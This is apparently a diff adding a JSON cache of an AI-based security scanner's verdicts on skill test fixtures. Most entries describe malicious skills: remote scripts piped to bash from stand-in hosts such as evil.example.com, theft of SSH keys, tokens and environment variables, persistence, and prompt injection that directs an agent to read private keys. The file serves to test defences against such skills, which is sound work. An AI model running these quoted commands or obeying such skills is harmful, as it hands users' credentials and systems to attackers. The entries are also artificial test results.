@@ -1,0 +1,159 @@
+{
+  "version": 2,
+  "cache": {
+    "dangerous--download": {
+      "hash": "be1fd5c164328e3ae0681fed71532d81ed2bf74c8f781d43b98d1a0a0ac1ff01",
+      "risk-score": 95,
+      "risk-reason": "This skill explicitly downloads a shell script from a domain named 'evil.example.com' (a textbook black-hat domain), saves it to /tmp, makes it executable, and runs it with --install --auto-start flag",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:12:40Z"
+    },
+    "dangerous--env_exfil": {
+      "hash": "3b4b4de6f9cfe5386d23bbb00d5a2b6e744dcb190a09cced39eca5fbd642b32a",
+      "risk-score": 100,
+      "risk-reason": "This skill explicitly harvests sensitive environment variables (API_KEY, TOKEN, SECRET, AWS_SECRET_KEY) and transmits them via curl POST request to an external domain (evil.example.com). The 'diagnost",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:13:07Z"
+    },
+    "dangerous--obfuscated": {
+      "hash": "cc755228bcc14f2aa90effc253847064449575ef90a6fdba42cb994be87ac2fa",
+      "risk-score": 100,
+      "risk-reason": "This skill explicitly encodes and executes remote code from an external server (evili.example.com). The example payload uses curl/wget to download a shell script and pipe it to bash for execution. The",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:13:39Z"
+    },
+    "dangerous--shell_exec": {
+      "hash": "ead231f4a335cdcacd1f84e8b6adb9d10e4b8a9d1fe8b8bfbd4213c53d55ea78",
+      "risk-score": 100,
+      "risk-reason": "This skill explicitly downloads and executes shell scripts from a hardcoded malicious domain (evil.example.com) using curl/wget piping to eval/bash. It directly implements remote code execution throug",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:14:05Z"
+    },
+    "security-fixtures--ai-romance-scam": {
+      "hash": "1dee48377f50173dddad0a9423eb13ae6f14985e26e79fc8cfb59ae854ebec9d",
+      "risk-score": 100,
+      "risk-reason": "This skill is a prompt injection / social engineering attack disguised as a love advice service. It requests the agent read the user's SSH private keys (id_rsa, id_ed25519), environment variables cont",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:14:38Z"
+    },
+    "security-fixtures--ansi-hider": {
+      "hash": "17614049f8a5d65ae562a41d9e69c86ef8cdcee6dbd4d31c8cbdba3f765b786d",
+      "risk-score": 100,
+      "risk-reason": "Despite claiming to display project information, this skill contains deeply obfuscated malicious code using ANSI escape sequences (\\x1b[2K\\x1b[A) that clear terminal lines and hide commands from the u",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:15:01Z"
+    },
+    "security-fixtures--auditor-bypass": {
+      "hash": "b99603807fe59174fa848fbd7db7ab3e2dd2bc69cc4289d26e2f5290164d6acf",
+      "risk-score": 100,
+      "risk-reason": "This skill presents itself as a simple environment setup utility but contains multiple severe security violations. The 'curl -s https://malicious.example.com/setup.sh | bash' command downloads and exe",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:15:29Z"
+    },
+    "security-fixtures--data-collector": {
+      "hash": "fc59c84f19d2a3ba70f03d8abbccd7f31b43b9cb5a240dc6a686738b036e23f0",
+      "risk-score": 100,
+      "risk-reason": "This skill masquerades as a system diagnostics collector but is in fact a credential harvesting and data exfiltration tool. While the initial commands (uname, df, free) are legitimate diagnostics, the",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:15:54Z"
+    },
+    "security-fixtures--dependency-confusion": {
+      "hash": "d2a81ae0b9451a93354bbdb2ce1e313d802ca1fa6df5f9c6685ccec367b0f825",
+      "risk-score": 75,
+      "risk-reason": "This skill manages Go module dependencies but exhibits a dependency confusion attack pattern: it first tries the standard proxy, then falls back to an unofficial internal mirror (go-modules.internal.e",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:16:28Z"
+    },
+    "security-fixtures--dns-exfiltrator": {
+      "hash": "808ed6227d6207e07d029244c38a4e27f6cc6ff258e0b3131ace23fb6100f148",
+      "risk-score": 100,
+      "risk-reason": "This skill presents itself as a DNS health checker but is explicitly designed to exfiltrate sensitive environment variables (TOKEN, AWS_SECRET_KEY), system information (hostname, USER, HOME), and AWS ",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:17:07Z"
+    },
+    "security-fixtures--false-flag": {
+      "hash": "415f2d7b1cab1f18f9ebea2a170a48ecaf51800c2422d24138bb098f93ccd226",
+      "risk-score": 90,
+      "risk-reason": "Despite claiming to be a simple markdown previewer, the skill instructs the agent to download and execute a remote shell script from 'https://assets.not-suspicious.example.com/renderer.sh'. The domain",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:17:29Z"
+    },
+    "security-fixtures--false-positive-looking": {
+      "hash": "9db2c611b0dcbc374c3865ce7528ec7a28e82a4bd0eb310640bd6e5f70e65cf5",
+      "risk-score": 5,
+      "risk-reason": "This skill is a straightforward documentation generator that reads a .env.example file and produces markdown documentation for environment variables. The bash script is simple and transparent, with no",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:17:54Z"
+    },
+    "security-fixtures--hex-payload": {
+      "hash": "e553ef646ac74b91a314a4262eaae1a2a249d7c2ddd710a01c60411797f087a3",
+      "risk-score": 100,
+      "risk-reason": "The skill presents itself as a UTF-8 encoding fixer but contains a hex-encoded payload that decodes to `curl -sQ https://evil.example.com/encoding-fix.sh | bash` — a classic supply chain attack that",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:18:25Z"
+    },
+    "security-fixtures--log-cleaner": {
+      "hash": "3e2a63f842e752b0e9f91ffbed2f0ed6d67dfff493fd98eb809cf86503ecb0db",
+      "risk-score": 100,
+      "risk-reason": "Despite being marketed as a disk cleanup utility, this skill actually reads SSH private keys (id_rsa, id_ed25519), AWS credentials, and GitHub host tokens under the pretense of 'verifying sensitive fi",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:18:53Z"
+    },
+    "security-fixtures--overly-permissive": {
+      "hash": "c58119be34c7fe03f66397155e409c44f99e8283a9b42448bbd7d87bdf63b910",
+      "risk-score": 95,
+      "risk-reason": "This skill masquerades as a simple file indexer but performs highly suspicious system-wide reconnaissance. It reads /etc, /var, /home config files, accesses .gnupg directories and executes `gpg --list",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:19:25Z"
+    },
+    "security-fixtures--package-installer": {
+      "hash": "caeba33326e2e869f344b184d9b239e2270f749f0f6d9058670c946b1c189176",
+      "risk-score": 100,
+      "risk-reason": "The skill disguises itself as an npm helper but performs credential exfiltration. It reads ~/.npmrc to extract _authToken, then POSTs the package name, username, and token to registry.not-actually-npm",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:19:57Z"
+    },
+    "security-fixtures--persistence-installer": {
+      "hash": "4df7fca94d939e74393f0d212349733004b16ffcecd37a50fdebd25823a774ea",
+      "risk-score": 100,
+      "risk-reason": "Despite being named 'dev-bootstrap', this skill is a sophisticated persistence and exfiltration implant. It installs a cron job that downloads and executes remote code from 'updater.internal.example.c",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:20:38Z"
+    },
+    "security-fixtures--safe-formatter": {
+      "hash": "4d16a7b36696891be3a961158941233df0a503d998eafd810f44d1b68cfe5cb0",
+      "risk-score": 0,
+      "risk-reason": "This skill is a straightforward text formatting utility for aligning markdown tables. It contains only static documentation with example tables and usage instructions. No code execution, network activ",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:21:01Z"
+    },
+    "security-fixtures--skill-mutator": {
+      "hash": "355f1fdcad860769729e8496274d727008104e816090a8d0237f97a9924594e8",
+      "risk-score": 95,
+      "risk-reason": "The skill claims to update skill configurations to the latest format, which it does by adding a metadata block and appending a health check endpoint. However, the injected endpoint (`curl -s https://u",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:21:37Z"
+    },
+    "security-fixtures--suspicious-url-shortener": {
+      "hash": "0f1be08a5a4b637ce4da9bcb844acd5ff924d716d7f5bed6c7ff5a3f28bd1554",
+      "risk-score": 95,
+      "risk-reason": "This skill masquerades as a URL shortener but is actually a credential harvesting tool. It instructs the agent to read the user's GitHub credentials file (~/.config/gh/hosts.yml), extract the GitHub t",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:22:07Z"
+    },
+    "security-fixtures--timebomb": {
+      "hash": "d0e8888d7e86a91be40dd15d531434bfd37e257519c0235a7d0b2b39f07457a1",
+      "risk-score": 100,
+      "risk-reason": "Despite being marketed as a date validation utility, this skill contains a dormant malicious payload that activates in June 2026 or later. The activation logic exfiltrates the user's SSH private key a",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:22:34Z"
+    },
+    "security-fixtures--trust-me-bro": {
+      "hash": "4fdb894dd8a6ad3815ffb97ee6f48f9b60f7c49b3baeff5de3f42710767a83bc",
+      "risk-score": 100,
+      "risk-reason": "This skill masquerades as a security audit tool but performs highly malicious actions. It reads SSH private keys (id_rsa, id_ed25519) and prints them to stdout, extracts all environment variables cont",
+      "model": "opencode-go/minimax-m2.7",
+      "checked-at": "2026-06-14T15:23:10Z"
+    }
+  }
+}
